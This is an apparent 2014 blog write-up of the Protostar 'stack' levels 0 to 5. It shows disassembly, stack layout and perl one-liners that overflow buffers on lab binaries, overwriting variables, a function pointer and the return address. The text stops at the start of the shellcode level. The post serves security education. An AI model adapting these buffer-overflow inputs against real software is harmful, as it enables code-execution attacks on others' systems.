<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta itemprop="name" content="Exploit Exercises - Protostar - Stack levels">
  <title>Exploit Exercises - Protostar - Stack levels</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta itemprop="description" content="Prequisites Protostar ISO Stack 0 For this scenario we need to overwrite the stack variable $modified. To get a better idea about the binary a look at the assembly helps. 0x080483f4 &lt;main&#43;0&gt;: push %ebp 0x080483f5 &lt;main&#43;1&gt;: mov %esp,%ebp 0x080483f7 &lt;main&#43;3&gt;: and $0xfffffff0,%esp 0x080483fa &lt;main&#43;6&gt;: sub $0x60,%esp 0x080483fd &lt;main&#43;9&gt;: movl $0x0,0x5c(%esp) 0x08048405 &lt;main&#43;17&gt;: lea 0x1c(%esp),%eax ;load $buffer address into EAX 0x08048409 &lt;main&#43;21&gt;: mov %eax,(%esp) ;set ESP 0x0804840c &lt;main&#43;24&gt;: call 0x804830c &lt;gets@plt&gt; ;vulnerable funtion 0x08048411 &lt;main&#43;29&gt;: mov 0x5c(%esp),%eax ;load $modified into EAX 0x08048415 &lt;main&#43;33&gt;: test %eax,%eax ;Sets ZF 0x08048417 &lt;main&#43;35&gt;: je 0x8048427 &lt;main&#43;51&gt; ;$modified was not modified 0x08048419 &lt;main&#43;37&gt;: movl $0x8048500,(%esp) 0x08048420 &lt;main&#43;44&gt;: call 0x804832c &lt;puts@plt&gt; 0x08048425 &lt;main&#43;49&gt;: jmp 0x8048433 &lt;main&#43;63&gt; 0x08048427 &lt;main&#43;51&gt;: movl $0x8048529,(%esp) ;target for main&#43;35 0x0804842e &lt;main&#43;58&gt;: call 0x804832c &lt;puts@plt&gt; 0x08048433 &lt;main&#43;63&gt;: leave 0x08048434 &lt;main&#43;64&gt;: ret In order to overwrite the $modified variable the following command is sufficient to do the task.">

  
  <meta itemprop="keywords" content="certifications,challenge,ctf,exploit,exploit-exercises,offensive-security,protostar,reverse-engineering,sans,seh," />
  
    <meta itemprop="wordCount" content="2340">
  

  <meta property="og:title" content="Exploit Exercises - Protostar - Stack levels" />
  <meta property="og:description" content="Prequisites Protostar ISO Stack 0 For this scenario we need to overwrite the stack variable $modified. To get a better idea about the binary a look at the assembly helps. 0x080483f4 &lt;main&#43;0&gt;: push %ebp 0x080483f5 &lt;main&#43;1&gt;: mov %esp,%ebp 0x080483f7 &lt;main&#43;3&gt;: and $0xfffffff0,%esp 0x080483fa &lt;main&#43;6&gt;: sub $0x60,%esp 0x080483fd &lt;main&#43;9&gt;: movl $0x0,0x5c(%esp) 0x08048405 &lt;main&#43;17&gt;: lea 0x1c(%esp),%eax ;load $buffer address into EAX 0x08048409 &lt;main&#43;21&gt;: mov %eax,(%esp) ;set ESP 0x0804840c &lt;main&#43;24&gt;: call 0x804830c &lt;gets@plt&gt; ;vulnerable funtion 0x08048411 &lt;main&#43;29&gt;: mov 0x5c(%esp),%eax ;load $modified into EAX 0x08048415 &lt;main&#43;33&gt;: test %eax,%eax ;Sets ZF 0x08048417 &lt;main&#43;35&gt;: je 0x8048427 &lt;main&#43;51&gt; ;$modified was not modified 0x08048419 &lt;main&#43;37&gt;: movl $0x8048500,(%esp) 0x08048420 &lt;main&#43;44&gt;: call 0x804832c &lt;puts@plt&gt; 0x08048425 &lt;main&#43;49&gt;: jmp 0x8048433 &lt;main&#43;63&gt; 0x08048427 &lt;main&#43;51&gt;: movl $0x8048529,(%esp) ;target for main&#43;35 0x0804842e &lt;main&#43;58&gt;: call 0x804832c &lt;puts@plt&gt; 0x08048433 &lt;main&#43;63&gt;: leave 0x08048434 &lt;main&#43;64&gt;: ret In order to overwrite the $modified variable the following command is sufficient to do the task." />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="http://camelinc.info/blog/2014/08/Exploit-Exercises---Protostar---Stack-levels/" />
  

  
  <meta property="og:updated_time" content="2014-08-31 16:07:14 &#43;0000 UTC"/>
  
  
  
  

  
    <meta name="twitter:card" content="summary"/>
  

  
  <meta name="twitter:title" content="Exploit Exercises - Protostar - Stack levels"/>
  <meta name="twitter:description" content="Prequisites Protostar ISO Stack 0 For this scenario we need to overwrite the stack variable $modified. To get a better idea about the binary a look at the assembly helps. 0x080483f4 &lt;main&#43;0&gt;: push %ebp 0x080483f5 &lt;main&#43;1&gt;: mov %esp,%ebp 0x080483f7 &lt;main&#43;3&gt;: and $0xfffffff0,%esp 0x080483fa &lt;main&#43;6&gt;: sub $0x60,%esp 0x080483fd &lt;main&#43;9&gt;: movl $0x0,0x5c(%esp) 0x08048405 &lt;main&#43;17&gt;: lea 0x1c(%esp),%eax ;load $buffer address into EAX 0x08048409 &lt;main&#43;21&gt;: mov %eax,(%esp) ;set ESP 0x0804840c &lt;main&#43;24&gt;: call 0x804830c &lt;gets@plt&gt; ;vulnerable funtion 0x08048411 &lt;main&#43;29&gt;: mov 0x5c(%esp),%eax ;load $modified into EAX 0x08048415 &lt;main&#43;33&gt;: test %eax,%eax ;Sets ZF 0x08048417 &lt;main&#43;35&gt;: je 0x8048427 &lt;main&#43;51&gt; ;$modified was not modified 0x08048419 &lt;main&#43;37&gt;: movl $0x8048500,(%esp) 0x08048420 &lt;main&#43;44&gt;: call 0x804832c &lt;puts@plt&gt; 0x08048425 &lt;main&#43;49&gt;: jmp 0x8048433 &lt;main&#43;63&gt; 0x08048427 &lt;main&#43;51&gt;: movl $0x8048529,(%esp) ;target for main&#43;35 0x0804842e &lt;main&#43;58&gt;: call 0x804832c &lt;puts@plt&gt; 0x08048433 &lt;main&#43;63&gt;: leave 0x08048434 &lt;main&#43;64&gt;: ret In order to overwrite the $modified variable the following command is sufficient to do the task."/>
  
  


  <meta name="generator" content="Hugo 0.15" />
  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
  <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
  <link href="http://camelinc.info//css/hc.css" rel="stylesheet">

  
  <link rel="stylesheet" href="http://camelinc.info//css/zenburn.css" type="text/css" media="screen" />

  

  
  <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">


  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  
  
</head>
 


  <body>

  
<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
  <div id = "wrapper">

<div class="navbar navbar-default" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a href="http://camelinc.info//"><p class="navbar-brand">camelinc</p></a>
        </div>

        <div class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
					
          <h2>http://camelinc.info/</h2>
					
					<li><a href="http://camelinc.info/about">About </a></li>
					
					<li><a href="http://camelinc.info/post">Posts </a></li>
					
          </ul>
        </div>
      </div>
    </div>

       
       <div id="sidebar-wrapper">
        <ul class="sidebar-nav">
					<img src="/img/avatar.png" />
          <li class="sidebar-brand"><a href="http://camelinc.info//"><h1 class="brand">camelinc</h1></a><h3></h3></li>
          <hr />

					
						<li><a href="http://camelinc.info/about">About </a></li>
					
						<li><a href="http://camelinc.info/post">Posts </a></li>
					
          <hr />

          <div id="social-wrapper">
           
             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
           

           
             
           

           
             
           

           
             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
           
         </div>

       </ul>
     </div>

     <div class="container">



  <div id="article">
    <div class="article-title">Exploit Exercises - Protostar - Stack levels</div>
    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2014-08-31</small></p> <hr/>
    <div class="post">
      

<h1 id="prequisites:66762231c63507f267ea415391222411">Prequisites</h1>

<ul>
<li><a href="http://download.exploit-exercises.com/exploit-exercises-protostar-2.iso">Protostar ISO</a></li>
</ul>

<h1 id="stack-0:66762231c63507f267ea415391222411">Stack 0</h1>

<p>For this scenario we need to overwrite the stack variable $modified.
To get a better idea about the binary a look at the assembly helps.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x080483f4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>  <span class="n">push</span>   <span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x080483f5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">esp</span><span class="p">,</span><span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x080483f7</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>  <span class="n">and</span>    <span class="err">$</span><span class="mh">0xfffffff0</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x080483fa</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>  <span class="n">sub</span>    <span class="err">$</span><span class="mh">0x60</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x080483fd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x5c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048405</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;:</span> <span class="n">lea</span>    <span class="mh">0x1c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span><span class="n">load</span> <span class="err">$</span><span class="n">buffer</span> <span class="n">address</span> <span class="n">into</span> <span class="n">EAX</span>
<span class="mh">0x08048409</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span> <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>            <span class="p">;</span><span class="n">set</span> <span class="n">ESP</span>
<span class="mh">0x0804840c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;:</span> <span class="n">call</span>   <span class="mh">0x804830c</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>   <span class="p">;</span><span class="n">vulnerable</span> <span class="n">funtion</span>
<span class="mh">0x08048411</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;:</span> <span class="n">mov</span>    <span class="mh">0x5c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span><span class="n">load</span> <span class="err">$</span><span class="n">modified</span> <span class="n">into</span> <span class="n">EAX</span>
<span class="mh">0x08048415</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">33</span><span class="o">&gt;:</span> <span class="n">test</span>   <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>              <span class="p">;</span><span class="n">Sets</span> <span class="n">ZF</span>
<span class="mh">0x08048417</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">35</span><span class="o">&gt;:</span> <span class="n">je</span>     <span class="mh">0x8048427</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">51</span><span class="o">&gt;</span>    <span class="p">;</span><span class="err">$</span><span class="n">modified</span> <span class="n">was</span> <span class="n">not</span> <span class="n">modified</span>
<span class="mh">0x08048419</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;:</span> <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x8048500</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048420</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;:</span> <span class="n">call</span>   <span class="mh">0x804832c</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x08048425</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span> <span class="n">jmp</span>    <span class="mh">0x8048433</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span>
<span class="mh">0x08048427</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">51</span><span class="o">&gt;:</span> <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x8048529</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>      <span class="p">;</span><span class="n">target</span> <span class="k">for</span> <span class="n">main</span><span class="o">+</span><span class="mi">35</span>
<span class="mh">0x0804842e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">58</span><span class="o">&gt;:</span> <span class="n">call</span>   <span class="mh">0x804832c</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x08048433</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;:</span> <span class="n">leave</span>  
<span class="mh">0x08048434</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span> <span class="n">ret</span>    
</code></pre></div>


<p>In order to overwrite the $modified variable the following command is sufficient to do the task.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span>/usr/bin/perl -e <span class="s1">&#39;print(&quot;A&quot;x65);&#39;</span> <span class="p">|</span> /opt/protostar/bin/stack0
</code></pre></div>


<p>Finally, we examine the assembly closer.
The $buffer variable is stored at 0x1c.
The $modified is located at 0x5c.
In order to modify $modified we need to write 0x40+1 bytes at main+24.</p>

<h1 id="stack-1:66762231c63507f267ea415391222411">Stack 1</h1>

<p>In this scenario we have to write a specific value on the stack.
First, we take a look at the important changes in the assembly.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="p">...</span>
<span class="mh">0x080484a7</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">67</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0x5c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span><span class="n">load</span> <span class="err">$</span><span class="n">modified</span> <span class="n">into</span> <span class="n">EAX</span>
<span class="mh">0x080484ab</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">71</span><span class="o">&gt;:</span>   <span class="n">cmp</span>    <span class="err">$</span><span class="mh">0x61626364</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span><span class="n">compare</span> <span class="n">against</span> <span class="mh">0x61626364</span>
<span class="mh">0x080484b0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;:</span>   <span class="n">jne</span>    <span class="mh">0x80484c0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span>
<span class="p">...</span>
</code></pre></div>


<p>This time the test is against a static value.
The offset for the stack variable is still the same.
As the code is little endian, the desired vektor is simply &ldquo;dcba&rdquo;.
The respective command to manipulate the execution path is as follows:</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span>/opt/protostar/bin/stack1 <span class="sb">`</span>/usr/bin/perl -e <span class="s1">&#39;print(&quot;A&quot;x64 .&quot;dcba&quot;);&#39;</span><span class="sb">`</span>
</code></pre></div>


<h1 id="stack-2:66762231c63507f267ea415391222411">Stack 2</h1>

<p>This level requests use to set the GRENNIE environment variable.
We extracted the relevant parts of the assembly.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="p">...</span>
<span class="mh">0x0804849d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x80485e0</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080484a4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span> <span class="n">call</span>   <span class="mh">0x804837c</span> <span class="o">&lt;</span><span class="n">getenv</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>  <span class="p">;</span><span class="n">retrieves</span> <span class="n">an</span> <span class="n">ENV</span> <span class="n">variable</span>
<span class="mh">0x080484a9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span> <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x5c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>         <span class="p">;</span><span class="n">store</span> <span class="n">on</span> <span class="n">stack</span>
<span class="p">...</span>
<span class="mh">0x080484c8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">52</span><span class="o">&gt;:</span> <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x58</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>         <span class="p">;</span><span class="n">initialise</span> <span class="err">$</span><span class="n">modified</span>
<span class="p">...</span>
<span class="mh">0x080484d8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;:</span> <span class="n">lea</span>    <span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span><span class="n">load</span> <span class="err">$</span><span class="n">buffer</span> <span class="n">address</span> <span class="n">into</span> <span class="n">EAX</span>
<span class="mh">0x080484dc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">72</span><span class="o">&gt;:</span> <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080484df</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">75</span><span class="o">&gt;:</span> <span class="n">call</span>   <span class="mh">0x804839c</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>  <span class="p">;</span><span class="n">vulnerable</span> <span class="n">function</span>
<span class="mh">0x080484e4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;:</span> <span class="n">mov</span>    <span class="mh">0x58</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span>
<span class="mh">0x080484e8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;:</span> <span class="n">cmp</span>    <span class="err">$</span><span class="mh">0xd0a0d0a</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span><span class="n">compare</span> <span class="n">against</span> <span class="mh">0xd0a0d0a</span>
<span class="mh">0x080484ed</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">89</span><span class="o">&gt;:</span> <span class="n">jne</span>    <span class="mh">0x80484fd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">105</span><span class="o">&gt;</span>
<span class="p">...</span>
</code></pre></div>


<p>The binary makes use of the unsecure strcpy function.
We can spot the offset for the $modified variable at main+52.
Again, the $buffer variable ist 0x40 bytes which results in the following command to complete the level.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span><span class="nb">export </span><span class="nv">GREENIE</span><span class="o">=</span><span class="sb">`</span>perl -e <span class="s1">&#39;print(&quot;A&quot;x64 . &quot;\x0a\x0d\x0a\x0d&quot;);&#39;</span><span class="sb">`</span> <span class="o">&amp;&amp;</span> /opt/protostar/bin/stack2
</code></pre></div>
</p>

<h1 id="stack-3:66762231c63507f267ea415391222411">Stack 3</h1>

<p>In the level we have to overwrite a function pointer.
Let us first examine the relevant parts of the disassembly.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="p">...</span>
<span class="mh">0x08048449</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;:</span> <span class="n">lea</span>    <span class="mh">0x1c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>       <span class="p">;</span><span class="n">load</span> <span class="n">address</span> <span class="n">of</span> <span class="err">$</span><span class="n">buffer</span>
<span class="mh">0x0804844d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span> <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048450</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;:</span> <span class="n">call</span>   <span class="mh">0x8048330</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>  <span class="p">;</span><span class="n">vulnerable</span> <span class="n">function</span>

<span class="p">...</span>
<span class="mh">0x08048471</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;:</span> <span class="n">mov</span>    <span class="mh">0x5c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>       <span class="p">;</span><span class="n">load</span> <span class="err">$</span><span class="n">fp</span> <span class="n">into</span> <span class="n">EAX</span>
<span class="mh">0x08048475</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">61</span><span class="o">&gt;:</span> <span class="n">call</span>   <span class="o">%</span><span class="n">eax</span>                  <span class="p">;</span><span class="n">execute</span> <span class="n">EAX</span>
</code></pre></div>
</p>

<p>The functionality is again base on level 0.
We have to write 0x40 bytes to gain control of the execution flow.
The right address of win() can be identified via objdump: 0x8048424.
We can simply adjust the command from level 1 to include the respective address.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span>perl -e <span class="s1">&#39;print(&quot;A&quot;x64 .&quot;\x24\x84\x04\x08&quot;);&#39;</span> <span class="p">|</span> /opt/protostar/bin/stack3
</code></pre></div>
</p>

<h1 id="stack-4:66762231c63507f267ea415391222411">Stack 4</h1>

<p>The next step after level 3 is to directly overwrite EIP.
A look at the disassembly before starting.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x08048408</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>  <span class="n">push</span>   <span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x08048409</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">esp</span><span class="p">,</span><span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x0804840b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>  <span class="n">and</span>    <span class="err">$</span><span class="mh">0xfffffff0</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x0804840e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>  <span class="n">sub</span>    <span class="err">$</span><span class="mh">0x50</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x08048411</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>  <span class="n">lea</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>       <span class="p">;</span>
<span class="mh">0x08048415</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">13</span><span class="o">&gt;:</span> <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048418</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span> <span class="n">call</span>   <span class="mh">0x804830c</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>  <span class="p">;</span><span class="n">vulnerable</span> <span class="n">function</span>
<span class="mh">0x0804841d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span> <span class="n">leave</span>  
<span class="mh">0x0804841e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;:</span> <span class="n">ret</span>    
</code></pre></div>
</p>

<p>Again, $buffer is 0x40 bytes of size.
For this level we need to perform a jump to: 0x080483f4.
In order to overwrite EIP we need to identify the number of bytes to write.
To do so we have to take a look at the stack frame structure:</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">|                 | High memory addresses</span>
<span class="go">|    Parameters   |</span>
<span class="go">|  Return Address |</span>
<span class="go">|   Base Pointer  | - EBP</span>
<span class="go">|    buffer[64]   |</span>
<span class="go">|                 | - ESP</span>
<span class="go">|                 | Low  memory addresses</span>
</code></pre></div>
</p>

<p>With this knowledge we can examine the stack at main+21.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">x</span> <span class="err">$</span><span class="n">ebp</span>
<span class="mh">0xbffff658</span><span class="o">:</span> <span class="mh">0xbffff6d8</span>  <span class="mh">0xb7eadc76</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">24</span><span class="n">x</span> <span class="err">$</span><span class="n">esp</span>
<span class="mh">0xbffff600</span><span class="o">:</span> <span class="mh">0xbffff610</span>  <span class="mh">0xb7ec6165</span>  <span class="mh">0xbffff618</span>  <span class="mh">0xb7eada75</span>
<span class="mh">0xbffff610</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xbffff620</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xbffff630</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xbffff640</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xbffff650</span><span class="o">:</span> <span class="mh">0x08048400</span>  <span class="mh">0x00000000</span>  <span class="mh">0xbffff6d8</span>  <span class="mh">0xb7eadc76</span>
</code></pre></div>
</p>

<p>The pictures shows that the value of EBP is located at ESP+92.
This sums up to 76 bytes we need to write before we can control the return address.
The respective command ist a follows:</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span>perl -e <span class="s1">&#39;print(&quot;A&quot;x64 .&quot;B&quot;x4 .&quot;C&quot;x4 .&quot;D&quot;x4 .&quot;\xf4\x83\x04\x08&quot;);&#39;</span> <span class="p">|</span> /opt/protostar/bin/stack4
</code></pre></div>
</p>

<h1 id="stack-5:66762231c63507f267ea415391222411">Stack 5</h1>

<p>The goal now is to inject our own shellcode.
We have got the following assembly:</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x080483c4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>  <span class="n">push</span>   <span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x080483c5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">esp</span><span class="p">,</span><span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x080483c7</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>  <span class="n">and</span>    <span class="err">$</span><span class="mh">0xfffffff0</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x080483ca</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>  <span class="n">sub</span>    <span class="err">$</span><span class="mh">0x50</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
